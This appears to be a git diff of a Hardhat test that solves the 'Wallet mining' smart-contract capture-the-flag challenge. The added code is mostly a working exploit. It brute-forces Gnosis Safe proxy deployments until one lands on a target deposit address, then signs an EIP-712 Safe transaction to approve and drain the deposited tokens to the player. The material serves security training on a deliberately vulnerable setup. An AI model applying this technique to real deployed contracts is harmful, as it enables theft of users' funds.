@@ -80,6 +80,13 @@ describe('[Challenge] Wallet mining', function () {
         /** CODE YOUR SOLUTION HERE */
 
         console.log("\n=== Exploit Begin ===\n");
+        console.log("Deployer:", deployer.address);
+        console.log("Ward:", ward.address);
+        console.log("Player:", player.address);
+
+        token = token.connect(player);
+        authorizer = authorizer.connect(player);
+        walletDeployer = walletDeployer.connect(player);
 
         // VULNERABILITY:
         // 0x9b6fb606a9f5789444c17768c6dfcf2f83563801 is not deployed on by anyone on local net, so
@@ -151,8 +158,8 @@ describe('[Challenge] Wallet mining', function () {
             ).contractAddress
         ).to.eq(PROXY_FACTORY);
 
-        let masterCopy = (await ethers.getContractFactory("GnosisSafe")).attach(MASTER_COPY);
-        let proxyFactory = (await ethers.getContractFactory("GnosisSafeProxyFactory")).attach(PROXY_FACTORY);
+        let masterCopy = (await ethers.getContractFactory("GnosisSafe", player)).attach(MASTER_COPY);
+        let proxyFactory = (await ethers.getContractFactory("GnosisSafeProxyFactory", player)).attach(PROXY_FACTORY);
 
         // ---
 
@@ -190,42 +197,11 @@ describe('[Challenge] Wallet mining', function () {
         // ---
 
         // STEP 3:
-        // debug: deploy Gnosis Safe
-        // {
-        //     let localCopy = await (await ethers.getContractFactory("GnosisSafe", deployer)).deploy();
-        //     let rcpt = await (await proxyFactory.connect(player).createProxy(
-        //         localCopy.address,
-        //         masterCopy.interface.encodeFunctionData(
-        //             "setup",
-        //             [
-        //                 [player.address], // owners
-        //                 1, // threshold
-        //                 ethers.constants.AddressZero, // to
-        //                 [], // data
-        //                 ethers.constants.AddressZero, // fallbackHandler
-        //                 ethers.constants.AddressZero, // paymentToken
-        //                 ethers.constants.AddressZero, // payment
-        //                 ethers.constants.AddressZero, // payment receiver
-        //             ]
-        //         )
-        //     )).wait();
-        //     let proxyAddr = "0x" + rcpt.logs[0].address.substr(-40);
-        //     console.log("proxy addr", proxyAddr);
-        //     let localSafe = (await ethers.getContractFactory("GnosisSafe", player)).attach(proxyAddr);
-        //     await Safe.executeContractCallWithSigners(
-        //         localSafe,
-        //         token,
-        //         "approve",
-        //         [player.address, DEPOSIT_TOKEN_AMOUNT],
-        //         [player]
-        //     );
-        //     return;
-        // }
-
-        // brute-force deploy Gnosis Safe wallets until we own the target address
+        // Brute-force deploy Gnosis Safe wallets until we own the target address.
+        // At the same time, receive the rewards for creating Safe wallets.
         let proxyAddr;
         for (let i = 0; i < 100; i++) {
-            let rcpt = await (await walletDeployer.connect(player).drop(
+            let rcpt = await (await walletDeployer.drop(
                 masterCopy.interface.encodeFunctionData(
                     "setup",
                     [
@@ -242,23 +218,39 @@ describe('[Challenge] Wallet mining', function () {
             )).wait();
 
             proxyAddr = "0x" + rcpt.logs[0].data.substr(-40);
+            setTracerTag(proxyAddr, "My Safe Wallet #" + i);
             if (proxyAddr == DEPOSIT_ADDRESS) {
                 console.log("Good wallet: ", i, proxyAddr);
                 break;
             }
         }
-        let safe = (await ethers.getContractFactory("GnosisSafe")).attach(proxyAddr);
+        let safe = (await ethers.getContractFactory("GnosisSafe", player)).attach(proxyAddr);
 
-        // execute function call on behalf of the wallet
-        // await (await Safe.executeContractCallWithSigners(
-        //     safe,
-        //     token,
-        //     "approve",
-        //     [player.address, DEPOSIT_TOKEN_AMOUNT],
-        //     [player]
-        // )).wait();
+        // Execute function call on behalf of player's safe by generating a player's signature (EIP-712)
+        let tx = Safe.buildContractCall(
+            token,
+            "approve",
+            [player.address, DEPOSIT_TOKEN_AMOUNT],
+            await safe.nonce()
+        );
 
-        // await (await token.connect(player).transferFrom(safe, player, DEPOSIT_TOKEN_AMOUNT)).wait();
+        let domain = { verifyingContract: safe.address };
+        expect(ethers.utils._TypedDataEncoder.hashDomain(domain)).to.eq(await safe.domainSeparator());
+
+        let sig = {
+            signer: player.address,
+            data: await player._signTypedData(domain, Safe.EIP712_SAFE_TX_TYPE, tx)
+        };
+        let r = sig.data.substring(0, 66);
+        let s = "0x" + sig.data.substring(66, 130);
+        let v = "0x" + sig.data.substring(130);
+
+        let digest = ethers.utils._TypedDataEncoder.hash(domain, Safe.EIP712_SAFE_TX_TYPE, tx);
+        let recoveredSigner = ethers.utils.recoverAddress(digest, {r, s, v});
+        expect(recoveredSigner).to.eq(player.address);
+
+        await (await Safe.executeTx(safe, tx, [sig], {gasLimit: 30000000})).wait();
+        await (await token.transferFrom(safe.address, player.address, DEPOSIT_TOKEN_AMOUNT)).wait();
 
         console.log("\n=== Exploit End ===\n");
     });
@@ -282,9 +274,9 @@ describe('[Challenge] Wallet mining', function () {
         ).to.not.eq('0x');
 
         // The deposit address and the Safe Deployer contract must not hold tokens
-        // expect(
-        //     await token.balanceOf(DEPOSIT_ADDRESS)
-        // ).to.eq(0);
+        expect(
+            await token.balanceOf(DEPOSIT_ADDRESS)
+        ).to.eq(0);
         expect(
             await token.balanceOf(walletDeployer.address)
         ).to.eq(0);
